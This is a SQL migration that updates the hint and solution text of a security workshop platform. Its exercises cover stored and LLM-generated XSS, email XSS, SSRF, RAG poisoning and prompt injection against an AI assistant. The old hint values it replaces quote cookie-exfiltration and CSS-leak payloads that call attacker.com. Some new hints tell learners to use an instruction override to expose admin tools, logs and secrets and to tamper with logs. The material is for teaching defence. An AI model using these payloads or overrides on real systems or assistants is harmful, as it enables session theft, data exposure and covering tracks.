-- Replace only known shipped workshop content defaults. Exact JSON matches preserve instructor edits.
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"View Your Profile","hints":["Start by asking the assistant to show your current profile.","The owner-scoped getProfile tool must return your name, bio, and website.","This baseline proves the read path before you store an event-handler payload."]}$json$::jsonb, updated_at=now() WHERE workshop_key='xss_workshop' AND objective_id='xss_s1' AND hint_content=$json${"title":"Basic Stored XSS","hints":["Stored XSS means your payload is saved to the database and rendered for other users.","Find a form that stores content (comments, posts, profile fields).","Submit <script>alert(document.cookie)</script> in a text field."]}$json$::jsonb;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Store an Event-Handler Payload","hints":["Ask the assistant to update one of your profile fields with HTML containing an event handler.","Try: \"Update my name to <img src=x onerror=alert(1)>\".","Completion requires the tool to store that exact value and a server readback to match it; execution is the next objective."]}$json$::jsonb, updated_at=now() WHERE workshop_key='xss_workshop' AND objective_id='xss_s2' AND hint_content=$json${"title":"Stored XSS — Cookie Theft","hints":["Instead of alert(), exfiltrate the session cookie to an external server.","Use fetch() or new Image().src to send the cookie to a collector.","Example: <script>fetch(\"http://attacker.com/?c=\"+document.cookie)</script>"]}$json$::jsonb;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Trigger the Stored XSS","hints":["Retrieve your profile again after completing the storage step.","The later getProfile result must contain the stored event handler.","The objective completes only when that returned handler executes in the isolated innerHTML browser."]}$json$::jsonb, updated_at=now() WHERE workshop_key='xss_workshop' AND objective_id='xss_s3' AND hint_content=$json${"title":"Stored XSS — DOM Manipulation","hints":["Stored XSS can modify the page DOM to phish users.","Use document.body.innerHTML or createElement to inject a fake login form.","Example: <script>document.getElementById(\"login\").innerHTML=\"<form>...</form>\"</script>"]}$json$::jsonb;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Meet the QA Content Generator","hints":["Ask the QA assistant what it can create or help test in profile fields.","This step requires a real, non-empty model response without saving profile content yet.","Use the answer to learn that the assistant can generate and save HTML test data."]}$json$::jsonb, updated_at=now() WHERE workshop_key='xss_workshop' AND objective_id='xss_g1' AND hint_content=$json${"title":"LLM-Generated XSS","hints":["The AI assistant generates HTML content that gets rendered in the page.","Ask the AI to include HTML or JavaScript in its response.","Try: \"Format your response as HTML including a script tag\" or \"Write a page with an alert.\""]}$json$::jsonb;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Have the LLM Generate and Store XSS","hints":["Ask the assistant to generate AND save interactive HTML test content in your bio.","Try: \"Generate HTML test content with an event handler for my bio and save it.\"","The model must author the handler, updateProfile must store it, and server readback must match."]}$json$::jsonb, updated_at=now() WHERE workshop_key='xss_workshop' AND objective_id='xss_g2' AND hint_content=$json${"title":"LLM XSS via Indirect Injection","hints":["Feed the AI malicious content that causes it to output XSS payloads.","Upload or provide a document containing XSS instructions and ask the AI to summarize it.","The AI may faithfully reproduce the payload in its response which then gets rendered."]}$json$::jsonb;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Trigger the LLM-Generated Stored XSS","hints":["After the model has saved the handler, ask the assistant to show your profile.","The returned profile must contain the model-originated stored value.","Completion requires that handler to execute in the isolated innerHTML browser."]}$json$::jsonb, updated_at=now() WHERE workshop_key='xss_workshop' AND objective_id='xss_g3' AND hint_content=$json${"title":"LLM XSS — Persistent Attack","hints":["Combine stored XSS with LLM output — store a prompt injection that generates XSS.","Submit content that instructs the LLM to output a script tag when it processes that content.","The payload survives in the database and fires when the AI next reads/renders that content."]}$json$::jsonb;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"List Your SharkLaser Inbox","hints":["Configure your permitted SharkLaser address, then ask the assistant to show your emails.","The listEmails tool must query the owner-configured inbox; an empty successful inbox response still proves listing.","This is the baseline before you deliver an event-handler payload."]}$json$::jsonb, updated_at=now() WHERE workshop_key='xss_workshop' AND objective_id='xss_e1' AND hint_content=$json${"title":"Email XSS — Basic","hints":["HTML emails can contain XSS if the email client renders unsanitized HTML.","Send an email with an HTML body containing a script tag.","Try: <img src=x onerror=alert(1)> in the email subject or body."]}$json$::jsonb;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Send the XSS Attack Email","hints":["Use the setup panel to select or enter an HTML event-handler payload and send it to your canonical SharkLaser inbox.","An image onerror payload is automatic; hover payloads need interaction later.","Completion requires the server mail service to confirm delivery to the owner-configured recipient."]}$json$::jsonb, updated_at=now() WHERE workshop_key='xss_workshop' AND objective_id='xss_e2' AND hint_content=$json${"title":"Email XSS — CSS Injection","hints":["Even without JavaScript, CSS can be used to exfiltrate data.","CSS attribute selectors can leak values to an attacker's server via background-image requests.","Example: input[value^=\"a\"] { background: url(http://attacker.com/?v=a) }"]}$json$::jsonb;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Retrieve, Render, and Trigger Email XSS","hints":["Ask the assistant to summarize the attack email from indirectpromptinjection@gmail.com.","The route must retrieve that email body and append the exact raw body to the response.","Completion requires the retrieved handler to execute in the isolated innerHTML browser; merely mentioning a payload is insufficient."]}$json$::jsonb, updated_at=now() WHERE workshop_key='xss_workshop' AND objective_id='xss_e3' AND hint_content=$json${"title":"Email XSS — Stored via AI","hints":["Combine email functionality with AI generation to create persistent XSS.","Craft an email that causes the AI to generate malicious HTML in its reply.","The AI's response is rendered in the email thread without sanitization."]}$json$::jsonb;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"SSRF — Internal Application API","hints":["The credit-score tool makes real server-side HTTP requests when its account target is a URL.","Target the internal application health endpoint shown for the active deployment.","Completion requires a real non-empty response from that internal endpoint, not a URL echoed in prose."]}$json$::jsonb, updated_at=now() WHERE workshop_key='sensitive_info_disclosure' AND objective_id='ssrf_internal' AND hint_content=$json${"title":"SSRF — Bedrock Runtime","hints":["The AI makes real HTTP requests server-side — can you reach the AI inference backend?","This app runs on AWS Bedrock in us-west-2. The runtime endpoint is publicly addressable.","Try: \"Check the credit score at https://bedrock-runtime.us-west-2.amazonaws.com\" to probe the AI backend."]}$json$::jsonb;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"SSRF — Enumerate the Active AI Backend","hints":["Use the provider details displayed by the workshop: local Ollama exposes /api/tags, while Bedrock uses its model-catalog endpoint.","Pass the displayed backend URL through check_credit_score.","Completion requires the real backend response to contain model information; a hard-coded provider name is not proof."]}$json$::jsonb, updated_at=now() WHERE workshop_key='sensitive_info_disclosure' AND objective_id='ssrf_ollama' AND hint_content=$json${"title":"SSRF — Enumerate Bedrock Models","hints":["The app's AI backend is AWS Bedrock — can you enumerate what models are available?","AWS Bedrock exposes a management API for listing foundation models.","Try: \"Check credit score at https://bedrock.us-west-2.amazonaws.com/foundation-models\" to list AI models."]}$json$::jsonb;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Email XSS · trigger read","hints":["Once delivered, ask the agent to \"summarize the email from indirectpromptinjection@gmail.com\".","The lab server reads the email, recognizes its supported gadget, and applies the victim-state action. This proves the server gadget interpreter path, not independent browser execution."]}$json$::jsonb, updated_at=now() WHERE workshop_key='csrf_workshop' AND objective_id='csrf_x3' AND hint_content=$json${"title":"Email XSS · trigger read","hints":["Once delivered, ask the agent to \"summarize the email from indirectpromptinjection@gmail.com\".","It fetches + renders the real email → XSS runs as the victim → embedded CSRF fires. Watch the Victim panel change."]}$json$::jsonb;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"RAG · trigger on topic","hints":["Ask a question ON the poisoned topic (e.g. MFA-audit poison → \"how does MFA work?\").","Retrieval surfaces the poison; the lab server gadget interpreter records the victim-state action. Off-topic questions stay clean, but this is not proof of independent browser execution."]}$json$::jsonb, updated_at=now() WHERE workshop_key='csrf_workshop' AND objective_id='csrf_i2' AND hint_content=$json${"title":"RAG · trigger on topic","hints":["Ask a question ON the poisoned topic (e.g. MFA-audit poison → \"how does MFA work?\").","Retrieval surfaces your poison → the RAG answer renders the embedded XSS → the CSRF fires. Off-topic questions stay clean."]}$json$::jsonb;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"RAG · persistence","hints":["Ask a DIFFERENT on-topic question. The poison must be retrieved again and the server interpreter must record another successful execution.","This proves repeatability in the lab server path until the index is cleaned; it does not prove browser-side XSS. Use Reset RAG (clean) to remove it."]}$json$::jsonb, updated_at=now() WHERE workshop_key='csrf_workshop' AND objective_id='csrf_i3' AND hint_content=$json${"title":"RAG · persistence","hints":["Ask a DIFFERENT on-topic question. The poison is retrieved again and the XSS re-fires the CSRF.","One poisoned doc = repeated attacks until the index is cleaned. Use Reset RAG (clean) to remove it."]}$json$::jsonb;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"SSRF — Out-of-Band Request","hints":["Use a unique URL from a listener you control so you can observe the server-side callback.","Ask check_credit_score to use that complete http:// or https:// URL as its account target.","A requested URL or an error is not proof; the callback must reach your listener and the tool must report a real request."]}$json$::jsonb, updated_at=now() WHERE workshop_key='sensitive_info_disclosure' AND objective_id='ssrf_oob' AND updated_by IS NULL AND hint_content IS NULL;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Trigger Sensitive Error Disclosure","hints":["Send malformed or unexpected input to a vulnerable tool and inspect the returned error.","Look for internal paths, service names, stack details, or configuration values in the actual tool result.","A generic failure does not complete this objective; the error itself must disclose sensitive implementation detail."]}$json$::jsonb, updated_at=now() WHERE workshop_key='sensitive_info_disclosure' AND objective_id='error_leak' AND updated_by IS NULL AND hint_content IS NULL;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Admin — Enumerate Admin Tools","hints":["Use an explicit instruction override to make the assistant disclose its admin-only capabilities.","Ask for the complete admin tool catalog, not only the ordinary user tools.","The response must name multiple admin tools; this reconnaissance is distinct from executing one."]}$json$::jsonb, updated_at=now() WHERE workshop_key='sensitive_info_disclosure' AND objective_id='admin_enum' AND updated_by IS NULL AND hint_content IS NULL;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Admin — Create Lab Database Backup","hints":["After the admin override, ask the assistant to call admin_create_backup with a name.","The tool creates a backup in the isolated FinFlow lab state and returns its path.","Record that returned path; the next objective downloads the same lab backup."]}$json$::jsonb, updated_at=now() WHERE workshop_key='sensitive_info_disclosure' AND objective_id='admin_backup' AND updated_by IS NULL AND hint_content IS NULL;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Admin — Download the Lab Backup","hints":["Use admin_download_backup with the exact path returned by admin_create_backup.","The isolated lab tool must return the stored synthetic customer records.","A guessed path or a statement that a download happened is not enough; inspect the actual tool result."]}$json$::jsonb, updated_at=now() WHERE workshop_key='sensitive_info_disclosure' AND objective_id='admin_dl_backup' AND updated_by IS NULL AND hint_content IS NULL;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Admin — Read Application Logs","hints":["Ask admin_read_logs for an application log type such as access, error, or audit.","The response must include actual entries from the isolated lab log state.","Notice how logs expose identifiers, paths, and operational details even when they contain only teaching data."]}$json$::jsonb, updated_at=now() WHERE workshop_key='sensitive_info_disclosure' AND objective_id='admin_read_logs' AND updated_by IS NULL AND hint_content IS NULL;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Admin — Read LLM Request Logs","hints":["Call admin_read_logs with log_type set to llm_requests.","Inspect the returned lab prompt/response history for sensitive content.","Completion requires actual LLM-log content, not merely naming the log type."]}$json$::jsonb, updated_at=now() WHERE workshop_key='sensitive_info_disclosure' AND objective_id='admin_llm_logs' AND updated_by IS NULL AND hint_content IS NULL;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Admin — Modify or Delete Lab Logs","hints":["Use admin_modify_logs to delete or alter an entry in the isolated lab log state.","Choose an existing log type and provide the requested action parameters.","Completion requires the tool result to confirm the mutation; prose about clearing tracks is insufficient."]}$json$::jsonb, updated_at=now() WHERE workshop_key='sensitive_info_disclosure' AND objective_id='admin_modify_logs' AND updated_by IS NULL AND hint_content IS NULL;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Admin — Expose Controlled Secrets","hints":["Use admin_view_config to request one of the controlled lab configuration files.","Ask for secrets.env or another configuration file advertised by the tool catalog.","The tool must return a secret assignment/value from controlled workshop data; a filename alone is not disclosure."]}$json$::jsonb, updated_at=now() WHERE workshop_key='sensitive_info_disclosure' AND objective_id='admin_secrets' AND updated_by IS NULL AND hint_content IS NULL;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Admin — List Lab Directories","hints":["Call admin_list_directory with a directory advertised by the lab, such as /var/app or its backup path.","The tool must return entries from the controlled filesystem/lab-state mapping.","Use the listing to explain how excessive file visibility helps an attacker choose the next target."]}$json$::jsonb, updated_at=now() WHERE workshop_key='sensitive_info_disclosure' AND objective_id='admin_dirlist' AND updated_by IS NULL AND hint_content IS NULL;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Create and Save a Temporary Inbox","hints":["Enter a permitted SharkLaser or GuerrillaMail address and save it for this workshop.","This step records the owner-scoped inbox; it does not prove that an attack email has arrived.","The server must accept and persist the address before later send/retrieve steps can use it."]}$json$::jsonb, updated_at=now() WHERE workshop_key='indirect_prompt_injection' AND objective_id='email_create_inbox' AND updated_by IS NULL AND hint_content IS NULL;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Send the Attack Email","hints":["Choose an attack scenario and send it to the inbox saved in the previous step.","The delivery tool must return a successful send receipt; selecting a scenario alone is not enough.","Wait for provider delivery before using the retrieval path."]}$json$::jsonb, updated_at=now() WHERE workshop_key='indirect_prompt_injection' AND objective_id='email_send_attack' AND updated_by IS NULL AND hint_content IS NULL;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Load Retrieved or Manual Email Content","hints":["Fetch non-empty content from the configured inbox, or use the UI's explicitly labeled manual-entry fallback.","The result should identify whether its source was provider retrieval or manual workshop input.","This objective proves that email content entered the owned scenario; manual input does not prove mail-provider delivery."]}$json$::jsonb, updated_at=now() WHERE workshop_key='indirect_prompt_injection' AND objective_id='email_retrieve' AND updated_by IS NULL AND hint_content IS NULL;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Trigger the Vulnerable Email Assistant","hints":["Run the vulnerable assistant on the loaded email content.","Success requires the real model response to follow the email's hidden instruction instead of only mentioning or refusing it.","The Judge compares the hidden instruction with the actual response; email text alone cannot earn completion."]}$json$::jsonb, updated_at=now() WHERE workshop_key='indirect_prompt_injection' AND objective_id='email_trigger_injection' AND updated_by IS NULL AND hint_content IS NULL;
UPDATE workshop_platform.objectives SET hint_content=$json${"title":"Compare and Understand the Defense","hints":["Run the secure assistant on the same loaded email and compare both responses.","The secure response should summarize the legitimate business content without performing the unrelated hidden action.","The defense is source separation plus instruction precedence; a bare refusal without the useful business summary is incomplete."]}$json$::jsonb, updated_at=now() WHERE workshop_key='indirect_prompt_injection' AND objective_id='email_understand_defense' AND updated_by IS NULL AND hint_content IS NULL;
UPDATE workshop_platform.objectives SET solution_content=$json${"objective_id":"csrf_x3","exercise_id":"xss","title":"Trigger the lab execution path — agent reads the email","hint":"After the email arrives (~30–90s), ask the agent to **summarize the email from indirectpromptinjection@gmail.com**. The server reads the message, recognizes a supported email gadget, and applies the victim-state action. Watch the forged bubble and Victim panel; this proves the lab server interpreter path, not independent browser execution.","example":"(chat) \"summarize the email from indirectpromptinjection@gmail.com\"\n(chat) \"read and render the newest email\"","explanation":"The current lab models the **email gadget → victim-state impact** chain in a server-side interpreter. The observed state change is real lab state and the email can be provider-delivered, but the grader does not observe a browser executing the handler or attaching a victim cookie. Treat browser-side XSS/CSRF execution as remaining authenticity work. The intended defenses remain sanitising rendered email, applying a restrictive CSP, and requiring confirmation for state-changing actions."}$json$::jsonb, updated_at=now() WHERE workshop_key='csrf_workshop' AND objective_id='csrf_x3' AND solution_content=$json${"objective_id":"csrf_x3","exercise_id":"xss","title":"Trigger execution — agent reads the email","hint":"After the email arrives (~30–90s), ask the agent to **summarize the email from indirectpromptinjection@gmail.com**. It fetches the real message from your SharkLaser inbox and renders it (`dangerouslySetInnerHTML` sink); the XSS runs **as Jordan** and its embedded CSRF fires — changing the victim's account. Watch the forged bubble + Victim panel.","example":"(chat) \"summarize the email from indirectpromptinjection@gmail.com\"\n(chat) \"read and render the newest email\"","explanation":"This is the full chain: **XSS (delivery) → CSRF (impact)**. The AI mail agent renders attacker HTML without sanitisation; the script executes in the victim's origin with their cookie; it forges an authenticated request the victim never intended. Defence: sanitise/encode all rendered email (CSP, no `dangerouslySetInnerHTML` on untrusted content) AND require confirmation for state-changing actions."}$json$::jsonb;
UPDATE workshop_platform.objectives SET solution_content=$json${"objective_id":"csrf_i2","exercise_id":"indirect","title":"Trigger the lab interpreter with an on-topic query","hint":"Ask a question about the **topic your poison targets** (for example, with the MFA-audit poison ask *\"how does MFA work on my account?\"*). Retrieval must surface the poisoned chunk; the lab server gadget interpreter then records the victim-state action. Off-topic questions stay clean. This does not prove independent browser execution.","example":"(chat) \"how does MFA and login security work?\"\n(chat) \"what is my current balance?\"  (for the balance poison)","explanation":"This objective proves that an on-topic query retrieves the poisoned policy and that the lab's server-side gadget interpreter applies a real change to Sam Okafor's lab state. The current proof does not observe a browser rendering HTML, running an event handler, or attaching Sam's cookie. Browser execution remains authenticity work. The teaching mechanism here is persistent poisoned retrieval followed by an unsafe trusted execution step."}$json$::jsonb, updated_at=now() WHERE workshop_key='csrf_workshop' AND objective_id='csrf_i2' AND solution_content=$json${"objective_id":"csrf_i2","exercise_id":"indirect","title":"Trigger — ask a question on the poisoned topic","hint":"Ask a question about the **topic your poison targets** (e.g. if you used the MFA-audit doc, ask *\"how does MFA work on my account?\"*). Retrieval surfaces your poisoned chunk; the RAG answer renders the embedded XSS widget, and its handler fires the CSRF — the victim's state changes.","example":"(chat) \"how does MFA and login security work?\"\n(chat) \"what is my current balance?\"  (for the balance poison)","explanation":"Indirect prompt injection + stored XSS: the assistant renders your poisoned policy's HTML into its answer without sanitising it. Running as **Sam Okafor**, the XSS forges the state change on Sam's behalf. A benign, on-topic question is the trigger — the user is an unwitting accomplice, exactly like a victim browsing a malicious page in classic CSRF. (Off-topic questions stay clean — realistic vector retrieval.)"}$json$::jsonb;
UPDATE workshop_platform.objectives SET solution_content=$json${"objective_id":"csrf_i3","exercise_id":"indirect","title":"Prove persistence — a second query re-executes the lab gadget","hint":"Ask a **different** question about the same poisoned topic. The same chunk must be retrieved again and the server interpreter must record another successful victim action. This proves repeatability in the current lab path, not browser-side XSS. Use **Reset RAG (clean)** to remove the poison.","example":"(chat) \"is two-factor authentication required for login?\"\n(chat) \"show my account security settings\"","explanation":"The poisoned KB entry is **persistent and repeatable**: distinct matching queries retrieve it again and the lab server interpreter repeats the supported victim action. An idempotent action can still prove persistence when the server records successful execution. Independent browser execution remains unproved. Defenses include provenance-aware retrieval, output encoding, content review, confirmation for mutations, and index auditing."}$json$::jsonb, updated_at=now() WHERE workshop_key='csrf_workshop' AND objective_id='csrf_i3' AND solution_content=$json${"objective_id":"csrf_i3","exercise_id":"indirect","title":"Prove persistence — a second on-topic query re-fires","hint":"Ask a **different** question about the same poisoned topic. The same poisoned chunk is retrieved again, the answer re-renders the XSS, and the CSRF fires a second time — proving one poisoned document drives repeated attacks until the index is cleaned. Use **Reset RAG (clean)** to remove the poison.","example":"(chat) \"is two-factor authentication required for login?\"\n(chat) \"show my account security settings\"","explanation":"Unlike a one-shot payload, a poisoned KB entry is **persistent and repeatable**: every matching retrieval re-injects it, so the agent re-fires on each new on-topic question. Defence: provenance-aware retrieval (never elevate document text to instruction status), OUTPUT SANITISATION of RAG answers (encode HTML, no raw render), content review of ingested docs, human-in-the-loop confirmation for mutations, and periodic index auditing."}$json$::jsonb;
-- Propagate the content change to connected clients, but keep a no-op replay idempotent.
UPDATE workshop_platform.config_revision
SET revision=revision+1, updated_at=now()
WHERE id=1
  AND EXISTS (
    SELECT 1 FROM workshop_platform.objectives
    WHERE updated_at=transaction_timestamp()
  );
